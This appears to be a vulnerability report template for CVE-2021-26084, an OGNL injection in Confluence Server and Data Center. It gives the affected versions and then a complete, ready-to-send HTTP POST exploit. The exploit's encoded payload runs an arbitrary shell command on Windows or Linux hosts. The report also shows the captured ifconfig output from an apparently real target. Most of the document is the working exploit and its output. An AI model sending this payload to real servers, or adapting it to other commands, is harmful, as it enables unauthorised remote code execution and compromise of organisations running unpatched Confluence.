#RCE in $DOMAIN [CVE-2021-26084]  


In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if ‘Allow people to sign up to create their account’ is enabled. To check whether this is enabled go to COG > User Management > User Signup Options. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 

POST

```
POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
Host: $DOMAIN
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Content-Length: 908
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

queryString=aaaaaaaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var+isWin+%3d+java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022)%3b+var+cmd+%3d+new+java.lang.String(\u0022ifconfig\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\u0022cmd.exe\u0022,+\u0022/c\u0022,+cmd)%3b+}+else{p.command(\u0022bash\u0022,+\u0022-c\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\u0022\u0022%3b+var+output+%3d+\u0022\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\u0027)}%2b\u0027


```

You will see the output of the ifconfig command

OUTPUT
```

                <input
    type="hidden"
          name="queryString"            value=
          "aaaaaaaa[eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 9001
        inet REDACTED  netmask 255.255.255.0  broadcast REDACTED
        inet6 REDACTED  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether REDACTED  txqueuelen 1000  (Ethernet)
        RX packets 482709483  bytes 496476707259 (462.3 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 309038833  bytes 56010315384 (52.1 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet REDACTED  netmask 255.0.0.0
        inet6 REDACTED  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 755630  bytes 135512823 (129.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 755630  bytes 135512823 (129.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```



## Impact

-   An unauthenticated, 3rd-party attacker or adversary can execute remote code
